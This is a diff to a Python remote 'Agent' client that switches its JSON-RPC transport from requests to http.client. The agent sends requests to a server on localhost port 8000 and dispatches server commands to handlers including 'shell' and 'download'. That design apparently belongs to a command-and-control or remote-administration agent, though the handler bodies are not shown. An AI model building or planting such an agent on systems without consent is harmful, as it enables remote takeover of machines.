@@ -1,4 +1,7 @@
-import requests
+#import requests
+import http.client
+import urllib.parse
+
 import os
 import time
 import threading
@@ -8,16 +11,17 @@ import socket
 import subprocess
 import base64
 
-SERVER = "http://127.0.0.1:8000/rpc"
+SERVER = "127.0.0.1"
+PORT = 8000
 MAX_BACKOFF = 15
 
 class Agent:
     def __init__(self):
+        self._conn = None
         self.client_id = None
-        self.session = requests.Session()
-        self.hostname = socket.gethostname()
         self.mac = self.get_mac()
-
+        self.hostname = socket.gethostname()
+        
         self.handlers = {
             "shell": self.handle_shell,
             "health": self.handle_health,
@@ -25,26 +29,37 @@ class Agent:
             "download": self.handle_download,
             "disconnect": self.handle_disconnect
         }
+    
+    def _get_conn(self):
+        if not self._conn:
+            self._conn = http.client.HTTPConnection(SERVER, PORT, timeout=70)
+        return self._conn
 
     def rpc(self, method, **params):
-        payload = {
+        payload = json.dumps ({
             "jsonrpc": "2.0",
             "method": method,
             "params": params,
             "id": str(uuid.uuid4())
-        }
+        }).encode()
 
         try:
-            res = self.session.post(
-                SERVER,
-                json = payload,
-                timeout = 70
+            conn = self._get_conn()
+            conn.request(
+                "POST", "/rpc",
+                body = payload,
+                headers = {
+                    "Content-Type": "application/json",
+                    "Content-Length": str(len(payload)),                   
+                }
             )
+            res = conn.getresponse()
 
-            if res.status_code == 204:
+            if res.status == 204:
+                res.read()
                 return None
             
-            data = res.json()
+            data = json.loads(res.read())
 
             if "error" in data:
                 err = data["error"]
@@ -52,7 +67,8 @@ class Agent:
                 
             return data.get("result")
 
-        except (requests.RequestException, ValueError):
+        except Exception:
+            self._conn = None
             raise
 
     @staticmethod
